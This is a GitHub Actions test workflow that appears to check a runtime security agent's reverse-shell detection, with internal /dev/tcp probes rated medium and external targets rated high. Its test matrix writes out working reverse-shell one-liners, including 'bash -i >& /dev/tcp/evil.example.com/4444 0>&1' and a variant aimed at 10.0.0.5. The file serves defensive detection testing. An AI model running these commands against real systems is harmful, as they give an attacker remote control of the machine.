# Verifies the agent-api change "lower reverse shell severity for internal-only
# /dev/tcp targets" (branch fix/reverse-shell-internal-severity).
#
# Customer case: before every build a composite action runs
#   timeout 5 bash -c '</dev/tcp/<cache>.svc.cluster.local/9092'
# to check an in-cluster cache is reachable. It was reported as a high severity
# Reverse-Shell and, with the lockdown response on, the runner was killed
# ~10 ms after the probe.
#
# Enable the reverse-shell lockdown response for this repo/workflow on int
# before dispatching.
#
#   internal-*  -> every /dev/tcp target is internal (cluster-local, RFC1918,
#                  link-local). Expected: Reverse-Shell detected at MEDIUM
#                  severity, job NOT killed, "Runner survived" step runs.
#   external-*  -> at least one external target. Expected: Reverse-Shell
#                  detected at default (high) severity and, with lockdown on,
#                  the job is killed.
name: reverse-shell-devtcp-probe

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  internal:
    name: internal-${{ matrix.case }}
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        include:
          # Same shape as the customer command. The host does not resolve on a
          # hosted runner, but bash is still exec'd with these arguments, which
          # is all the detection looks at.
          - case: cluster-local-probe
            script: "</dev/tcp/cache.build.svc.cluster.local/9092"
          - case: rfc1918-probe
            script: "</dev/tcp/10.0.0.5/9092"
          - case: link-local-probe
            script: "</dev/tcp/169.254.169.254/80"
          # A full reverse shell shape, but to an internal IP: still medium,
          # still not killed.
          - case: rfc1918-interactive-shell
            script: "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@rc-20-int
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            api.github.com:443

      - name: Reverse shell pattern
        env:
          SCRIPT: ${{ matrix.script }}
        run: timeout 5 bash -c "$SCRIPT" </dev/null || echo "probe finished (exit $?)"

      - name: Runner survived
        run: sleep 20 && echo "runner still alive"

  external:
    name: external-${{ matrix.case }}
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        include:
          - case: classic-shell
            script: "bash -i >& /dev/tcp/evil.example.com/4444 0>&1"
          - case: public-probe
            script: "</dev/tcp/github.com/443"
          - case: mixed-internal-external
            script: "</dev/tcp/10.0.0.5/80; bash -i >& /dev/tcp/evil.example.com/4444 0>&1"
    steps:
      - name: Harden Runner
        uses: step-security/harden-runner@rc-20-int
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            api.github.com:443

      - name: Reverse shell pattern
        env:
          SCRIPT: ${{ matrix.script }}
        run: timeout 5 bash -c "$SCRIPT" </dev/null || echo "probe finished (exit $?)"

      - name: Runner survived (should NOT be reached with lockdown on)
        run: sleep 20 && echo "runner still alive"
